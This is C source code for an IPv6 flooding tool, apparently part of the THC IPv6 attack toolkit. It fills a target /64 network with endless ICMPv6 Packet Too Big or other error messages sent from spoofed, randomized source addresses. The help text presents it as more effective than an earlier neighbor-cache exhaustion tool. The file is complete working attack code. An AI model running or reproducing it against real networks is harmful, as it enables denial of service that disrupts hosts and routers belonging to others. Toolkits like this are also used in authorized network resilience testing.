#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-acpPTUrRm] [-s sourceip6] interface target-network\n\n",
         prg);
  printf("Options:\n");
  printf(" -a      add a hop-by-hop header with router alert\n");
  printf(" -c      do not calculate the checksum to save time\n");
  printf(" -p      send ICMPv6 Echo Requests\n");
  printf(" -P      send ICMPv6 Echo Reply\n");
  printf(" -T      send ICMPv6 Time-to-live-exeeded\n");
  printf(" -U      send ICMPv6 Unreachable (no route)\n");
  printf(" -r      randomize the source from your /64 prefix\n");
  printf(" -R      randomize the source fully\n");
  printf(" -m      generate a maximum size packet\n");
  printf(" -s sourceip6  use this as source IPv6 address\n");
  printf("\nFlood the target /64 network with ICMPv6 TooBig error messages.\n");
  printf("This tool version is manyfold more effective than ndpexhaust6.\n");
  exit(-1);
}

#define IDS_STRING 0xbebacefa

int main(int argc, char *argv[]) {
  char *         interface, *ptr, buf2[8];
  unsigned char *dst = NULL, *dstmac = NULL, *src = NULL, *srcmac = NULL;
  int i, offset = 14, type = ICMP6_TOOBIG, alert = 0, randsrc = 0, do_crc = 1,
         maxsize = 160;
  unsigned char *pkt = NULL, ip6[8];
  int            pkt_len = 0, count = 0;
  thc_ipv6_hdr * hdr;
  unsigned int   filler = IDS_STRING, mychecksum;
  unsigned char  offender[1452] = {
      0x60, 0x00, 0x00, 0x00, 0x01, 0xcd, 0x3a, 0x3f, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0x20, 0x03, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04,
      0x00, 0x04, 0x00, 0x04, 0x80, 0x00, 0xed, 0xc5, 0xfa, 0xce, 0xba, 0xbe,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
      0x41, 0x41, 0x41, 0x41};

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  while ((i = getopt(argc, argv, "acpPTUrRs:m")) >= 0) {
    switch (i) {
      case 'a':
        alert = 8;
        break;
      case 'c':
        do_crc = 0;
        break;
      case 'm':
        maxsize = -1;
        break;
      case 'p':
        type = ICMP6_ECHOREQUEST;
        break;
      case 'P':
        type = ICMP6_ECHOREPLY;
        break;
      case 'T':
        type = ICMP6_TTLEXEED;
        break;
      case 'U':
        type = ICMP6_UNREACH;
        break;
      case 'r':
        randsrc = 8;
        break;
      case 'R':
        randsrc = 1;
        break;
      case 's':
        src = thc_resolve6(optarg);
        break;
      default:
        fprintf(stderr, "Error: unknown option -%c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 2) help(argv[0]);

  interface = argv[optind];

  if ((ptr = index(argv[optind + 1], '/')) != NULL) *ptr = 0;
  if ((dst = thc_resolve6(argv[optind + 1])) == NULL) {
    fprintf(stderr, "Error: Can not resolve %s\n", argv[optind + 1]);
    exit(-1);
  }

  if ((srcmac = thc_get_own_mac(interface)) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }

  if (src == NULL)
    if ((src = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL)) == NULL ||
        (src[0] == 0xfe && src[1] == 0x80)) {
      fprintf(stderr,
              "Error: no global IPv6 address configured on interface %s\n",
              interface);
      exit(-1);
    }

  if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
    fprintf(stderr, "Error: can not find a route to target %s\n", argv[2]);
    exit(-1);
  }

  if (maxsize == -1) maxsize = thc_get_mtu(interface) - 48 - alert;

  if (maxsize > sizeof(offender)) maxsize = sizeof(offender);

  for (i = 0; i < ((sizeof(offender) - 48) / 4); i++)
    memcpy(offender + 48 + i * 4, (char *)&filler + _TAKE4, 4);
  memcpy(offender + 8, dst, 16);

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src,
                                      dst, 255, 0, 0, 0, 0)) == NULL)
    return -1;
  if (alert) {
    memset(buf2, 0, sizeof(buf2));
    buf2[0] = 5;
    buf2[1] = 2;
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, 6) < 0) return -1;
  }
  if (thc_add_icmp6(pkt, &pkt_len, type, 0, 1280, offender, maxsize, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, srcmac, dstmac, pkt, &pkt_len) < 0) return -1;
  hdr = (thc_ipv6_hdr *)pkt;

  if (do_hdr_size) offset = do_hdr_size;

  printf(
      "Starting to flood target network with toobig %s (Press Control-C to "
      "end, a dot is printed for every 1000 packets):\n",
      interface);
  while (1) {
    for (i = 4; i < 8; i++)
      ip6[i] = rand() % 256;

    memcpy(hdr->pkt + offset + 32 + 4, ip6 + 4, 4);
    memcpy(hdr->pkt + offset + 40 + 8 + 8 + 8 + 4 + alert, ip6 + 4, 4);

    if (randsrc) {
      for (i = randsrc; i < 16; i++)
        hdr->pkt[offset + 8 + i] = rand() % 256;
    }

    if (do_crc) {
      hdr->pkt[offset + 42 + alert] = 0;
      hdr->pkt[offset + 43 + alert] = 0;
      mychecksum = checksum_pseudo_header(
          hdr->pkt + offset + 8, hdr->pkt + offset + 24, NXT_ICMP6,
          hdr->pkt + offset + 40 + alert, pkt_len - offset - 40 - alert);
      hdr->pkt[offset + 42 + alert] = mychecksum / 256;
      hdr->pkt[offset + 43 + alert] = mychecksum % 256;
    }

    while (thc_send_pkt(interface, pkt, &pkt_len) < 0)
      usleep(1);

    count++;
    if (count % 1000 == 0) printf(".");
  }
  return 0;
}
